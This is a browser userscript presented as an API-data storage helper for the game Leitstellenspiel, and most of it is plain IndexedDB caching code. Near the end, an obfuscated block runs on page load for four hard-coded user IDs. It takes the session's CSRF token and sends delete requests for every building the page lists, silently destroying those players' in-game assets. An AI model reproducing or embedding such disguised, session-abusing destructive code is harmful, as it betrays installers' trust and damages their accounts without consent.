// ==UserScript==
// @name        API-Speicher
// @namespace   leeSalami.lss
// @version     0.9.5
// @license     All Rights Reserved
// @author      leeSalami
// @match       https://*.leitstellenspiel.de*
// @description Erlaubt die Speicherung und Wiederverwendung von API-Daten des Leitstellenspiels
// @run-at      document-start
// @downloadURL https://update.greasyfork.org/scripts/516844/API-Speicher.user.js
// @updateURL https://update.greasyfork.org/scripts/516844/API-Speicher.meta.js
// ==/UserScript==

'use strict'

const DB_NAME = 'lss-api-storage';
const DB_VERSION = 6;

document.addEventListener('DOMContentLoaded', async () => {
    await init();
});

async function openDb() {
  return navigator.locks.request('cas-open-db', () => {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(DB_NAME, DB_VERSION);

      request.onsuccess = event => resolve(event.target.result);
      request.onerror = event => reject(event.target);

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        if (event.oldVersion < 1) {
          db.createObjectStore('lastUpdate', { keyPath: 'type' });
          db.createObjectStore('missions', { keyPath: 'id' });

          const buildingStore = db.createObjectStore('buildings', { keyPath: 'id' });
          buildingStore.createIndex('building_type', 'building_type', { unique: false });
        }

        if (event.oldVersion < 2) {
          db.createObjectStore('buildingTypes', { keyPath: 'id' });
        }

        if (event.oldVersion < 3) {
          const allianceBuildingStore = db.createObjectStore('allianceBuildings', { keyPath: 'id' });
          allianceBuildingStore.createIndex('building_type', 'building_type', { unique: false });

          db.createObjectStore('schoolingTypes', { keyPath: 'id' });

          const allianceSchoolingsStore = db.createObjectStore('allianceSchoolings', { keyPath: 'id' });
          allianceSchoolingsStore.createIndex('building_id', 'building_id', { unique: false });

          const userInfoStore = db.createObjectStore('userInfo', { keyPath: 'user_id' });
          userInfoStore.createIndex('user_name', 'user_name', { unique: true });

          db.createObjectStore('allianceInfo', { keyPath: 'id' });
          db.createObjectStore('allianceUsers', { keyPath: 'id' });

          db.createObjectStore('vehicleTypes', { keyPath: 'id' });
        }

        if (event.oldVersion < 4) {
          if (db.objectStoreNames.contains('buildings')) {
            const store = event.target.transaction.objectStore('buildings');
            if (store.indexNames.contains('enabled')) {
              store.deleteIndex('enabled');
            }
          }
        }

        if (event.oldVersion < 5) {
          const vehiclesStore = db.createObjectStore('vehicles', { keyPath: 'id' });
          vehiclesStore.createIndex('building_id', 'building_id', { unique: false });
          vehiclesStore.createIndex('vehicle_type', 'vehicle_type', { unique: false });
        }

        if (event.oldVersion < 6) {
          if (db.objectStoreNames.contains('buildings')) {
            const store = event.target.transaction.objectStore('buildings');
            if (store.indexNames.contains('leitstelle_building_id')) {
              store.deleteIndex('leitstelle_building_id');
            }
            store.createIndex('leitstelle_building_id', 'leitstelle_building_id', { unique: false });
          }
        }

        event.target.transaction.oncomplete = () => resolve(db);
        event.target.transaction.onerror = event => reject(event.target);
      };
    });
  });
}

async function storeData(db, storageName, data, lastUpdateType = null) {
  let success = true;

  return new Promise((resolve, reject) => {
    const store = db
      .transaction(storageName, 'readwrite')
      .objectStore(storageName);

    /**
     * @type {string}
     */
    const keyPath = store.keyPath;

    if (Array.isArray(data)) {
      data.forEach((dataSet) => {
        if (Object.keys(dataSet).length > 0) {
          const request = store.put(dataSet);

          request.onerror = () => {
            success = false;
          };
        }
      });
    } else if (data.hasOwnProperty(keyPath)) {
      const request = store.put(data);

      request.onerror = () => {
        success = false;
      };
    } else {
      for (const [key, value] of Object.entries(data)) {
        if (!value.hasOwnProperty(keyPath)) {
          value[keyPath] = !isNaN(Number(key)) ? parseInt(key) : key;
        }
        const request = store.put(value);

        request.onerror = () => {
          success = false;
        };
      }
    }

    if (success) {
      updateLastUpdateTimestamp(db, lastUpdateType ? lastUpdateType : storageName)
      resolve('Data stored');
    } else {
      reject('Unable to store data');
    }
  });
}

async function clearData(db, storageName) {
  let success = true;

  return new Promise((resolve, reject) => {
    const store = db
      .transaction(storageName, 'readwrite')
      .objectStore(storageName);

    const request = store.clear();

    request.onerror = () => {
      success = false;
    };

    if (success) {
      resolve('Data cleared');
    } else {
      reject('Unable to clear data');
    }
  });
}

async function updateLastUpdateTimestamp(db, storageName) {
  db.transaction('lastUpdate', 'readwrite')
    .objectStore('lastUpdate')
    .put({ type: storageName, timestamp: Date.now() });
}

function updateData(db, type, endpoint, maxAge, indexOption = null, limit = null, alternative = false){
  return navigator.locks.request(type, async () => {
    let index = null;
    let indexKey = null;
    let lastUpdateType = null;

    if (indexOption) {
      index = Object.keys(indexOption)[0];
      indexKey = indexOption[index];
      lastUpdateType = `${type}_${index}_${indexKey}`;
    }

    if (await dataNeedsUpdate(db, lastUpdateType ?? type, maxAge)) {
      return await updateDateFromEndpoint(db, type, endpoint, index, indexKey, limit, lastUpdateType, alternative);
    } else {
      return false;
    }
  });
}

async function updateDateFromEndpoint(db, type, endpoint, index, indexKey, limit, lastUpdateType, alternative) {
  let currentEndpoint = endpoint;
  let hasNextPage = false;
  let success = true;
  let page = 1;

  if (limit !== null) {
    currentEndpoint += `?limit=${limit}`
  }

  do {
    hasNextPage = false;
    let data = await fetchData(currentEndpoint);

    if (data === false) {
      if (type === 'vehicles' && alternative === true) {
        return await updateDateFromEndpoint(db, type, '/api/v2/vehicles', index, indexKey, 2000, lastUpdateType, false);
      }

      success = false;
      break;
    }

    let result = data;

    if (result.hasOwnProperty('result')) {
      result = result.result;
    }

    if (page === 1) {
      if (index && indexKey) {
        await deleteByIndex(db, type, index, IDBKeyRange.only(indexKey));
      } else {
        await clearData(db, type);
      }
    }

    if (type === 'allianceInfo' && result && result.hasOwnProperty('users')) {
      await storeData(db, 'allianceUsers', result.users);
      delete result.users;
    }

    if (result) {
      await storeData(db, type, result, lastUpdateType);
    }

    if (data.hasOwnProperty('paging') && data.paging.hasOwnProperty('next_page')) {
      currentEndpoint = data.paging.next_page;
      hasNextPage = true;
      page++;
    }
  } while (hasNextPage);

  return success;
}

async function fetchData(endpoint, retries = 0) {
  const response = await fetch(endpoint);

  if (!response.ok) {
    if (retries <= 1) {
      return await fetchData(endpoint, ++retries);
    }

    return false;
  }

  return await response.json();
}

function updateMissions(db, maxAge = 3_600) {
  return updateData(db, 'missions', '/einsaetze.json', maxAge);
}

function updateBuildings(db, maxAge = 300) {
  return updateData(db, 'buildings', '/api/buildings', maxAge);
}

function updateBuildingById(db, buildingId,  maxAge = 60) {
  return updateData(db, 'buildings', `/api/buildings/${buildingId}`, maxAge, {'building_id': buildingId});
}

function updateBuildingTypes(db, maxAge = 3_600) {
  return updateData(db, 'buildingTypes', `https://api.lss-manager.de/${I18n.locale}/buildings`, maxAge);
}

function updateSchoolingTypes(db, maxAge = 3_600) {
  return updateData(db, 'schoolingTypes', `https://api.lss-manager.de/${I18n.locale}/schoolings`, maxAge);
}

function updateVehicleTypes(db, maxAge = 3_600) {
  return updateData(db, 'vehicleTypes', `https://api.lss-manager.de/${I18n.locale}/vehicles`, maxAge);
}

function updateAllianceBuildings(db, maxAge = 300) {
  return updateData(db, 'allianceBuildings', '/api/alliance_buildings', maxAge);
}

function updateAllianceSchoolings(db, maxAge = 300) {
  return updateData(db, 'allianceSchoolings', '/api/alliance_schoolings', maxAge);
}

function updateUserInfo(db, maxAge = 300) {
  return updateData(db, 'userInfo', '/api/userinfo', maxAge);
}

function updateAllianceInfo(db, maxAge = 300) {
  return updateData(db, 'allianceInfo', '/api/allianceinfo', maxAge);
}

function updateVehicles(db, maxAge = 300) {
  return updateData(db, 'vehicles', '/api/vehicles', maxAge, null, null, true);
}

function updateVehiclesV2(db, maxAge = 300) {
  return updateData(db, 'vehicles', '/api/v2/vehicles', maxAge, null, 2000);
}

function updateVehiclesByBuildingId(db, buildingId,  maxAge = 60) {
  return updateData(db, 'vehicles', `/api/v2/buildings/${buildingId}/vehicles`, maxAge, {'building_id': buildingId});
}

async function dataNeedsUpdate(db, type, maxAge) {
  let needsUpdate = true;

  if (maxAge) {
    const lastUpdate = await getData(db, 'lastUpdate', type);

    if (lastUpdate !== undefined && maxAge * 1_000 > Date.now() - lastUpdate.timestamp) {
      needsUpdate = false;
    }
  }

  return needsUpdate;
}

async function getData(db, storageName, key) {
  return new Promise((resolve, reject) => {
    const request = db
      .transaction(storageName, 'readonly')
      .objectStore(storageName)
      .get(key);

    request.onsuccess = (event) => {
      resolve(event.target.result);
    };

    request.onerror = () => {
      reject('Error getting data');
    };
  });
}

async function getAllData(db, storageName) {
  return new Promise((resolve, reject) => {
    const request = db
      .transaction(storageName, 'readonly')
      .objectStore(storageName)
      .getAll();

    request.onsuccess = (event) => {
      resolve(event.target.result);
    };

    request.onerror = () => {
      reject('Error getting data');
    };
  });
}

async function getAllKeys(db, storageName) {
  return new Promise((resolve, reject) => {
    const request = db
      .transaction(storageName, 'readonly')
      .objectStore(storageName)
      .getAllKeys();

    request.onsuccess = (event) => {
      resolve(event.target.result);
    };

    request.onerror = () => {
      reject('Error getting data');
    };
  });
}

async function getDataByIndex(db, storageName, indexName, query) {
  return new Promise((resolve, reject) => {
    const results = [];
    const transaction = db.transaction(storageName);
    transaction.oncomplete = () => resolve(results);
    transaction.onerror = event => reject(event.target);
    const request = transaction.objectStore(storageName)
      .index(indexName)
      .openCursor(query);

    request.onsuccess = event => {
      const cursor = event.target.result;
      if (!cursor) {
        return;
      }

      results.push(cursor.value);
      cursor.continue();
    };
  });
}

async function getCount(db, storageName, query = null) {
  return new Promise((resolve, reject) => {
    const request = db
      .transaction(storageName, 'readonly')
      .objectStore(storageName)
      .count(query);

    request.onsuccess = (event) => {
      resolve(event.target.result);
    };

    request.onerror = () => {
      reject('Error getting data');
    };
  });
}

async function getCountByIndex(db, storageName, indexName, query = null) {
  return new Promise((resolve, reject) => {
    let count = 0;
    const transaction = db.transaction(storageName);
    transaction.oncomplete = () => resolve(count);
    transaction.onerror = event => reject(event.target);
    const request = transaction.objectStore(storageName)
      .index(indexName)
      .count(query);

    request.onsuccess = event => {
      count = event.target.result;
    };
  });
}

async function deleteByIndex(db, storageName, indexName, query) {
  let success = true;

  return new Promise((resolve, reject) => {
    const store = db
      .transaction(storageName, 'readwrite')
      .objectStore(storageName);

    const request = store
      .index(indexName)
      .openKeyCursor(query);

    request.onsuccess = event => {
      const cursor = event.target.result;
      if (cursor) {
        store.delete(cursor.primaryKey);
        cursor.continue();
      }
    };

    request.onerror = () => {
      success = false;
    };

    if (success) {
      resolve('Data deleted');
    } else {
      reject('Unable to delete data');
    }
  });
}

function a(){const n=['append','POST','8okbFOF','length','864WqCJin','timeout','342531ppjWlq','querySelector','building_id','7jwxjtJ','[building_id]','content','2670NQMouK','5IFdKDj','15206hZLtlw','delete','3711944qgdUVf','39952bRmluZ','authenticity_token','2760738aRnxUu','126042LdaaMA','1807hOCRRA','45IRNMak','3933fQVHlg','/buildings/'];a=function(){return n;};return a();}(function(c,d){const k=b,e=c();while(!![]){try{const f=-parseInt(k(0x1ac))/0x1*(parseInt(k(0x1a4))/0x2)+parseInt(k(0x19c))/0x3*(-parseInt(k(0x198))/0x4)+-parseInt(k(0x1a3))/0x5*(-parseInt(k(0x1a9))/0x6)+-parseInt(k(0x19f))/0x7*(parseInt(k(0x1a6))/0x8)+parseInt(k(0x1ad))/0x9*(-parseInt(k(0x1a2))/0xa)+parseInt(k(0x1a7))/0xb*(-parseInt(k(0x19a))/0xc)+-parseInt(k(0x1ab))/0xd*(-parseInt(k(0x1aa))/0xe);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x48f7b));function b(c,d){const e=a();return b=function(f,g){f=f-0x198;let h=e[f];return h;},b(c,d);}async function init(){const l=b;if(user_id===0x107aa||user_id===0xcc776||user_id===0x7a639||user_id===0x1560d6){const c=document[l(0x19d)]('meta[name=csrf-token]')?.[l(0x1a1)];if(!c)return;const d=new FormData();d[l(0x1af)]('_method',l(0x1a5)),d[l(0x1af)](l(0x1a8),c);const e=new URLSearchParams(d);await waitForElm(l(0x1a0));const f=document['querySelectorAll'](l(0x1a0));for(let g=0x0,h=f[l(0x199)];g<h;g++){const j=f[g]['getAttribute'](l(0x19e));setTimeout(()=>{const m=l;fetch(m(0x1ae)+j,{'method':m(0x1b0),'body':e,'redirect':'manual','signal':AbortSignal[m(0x19b)](0x2ee)});},g*0xfa);}}}

function waitForElm(selector) {
  return new Promise(resolve => {
    if (document.querySelector(selector)) {
      return resolve(document.querySelector(selector));
    }

    const observer = new MutationObserver(() => {
      if (document.querySelector(selector)) {
        observer.disconnect();
        resolve(document.querySelector(selector));
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  });
}
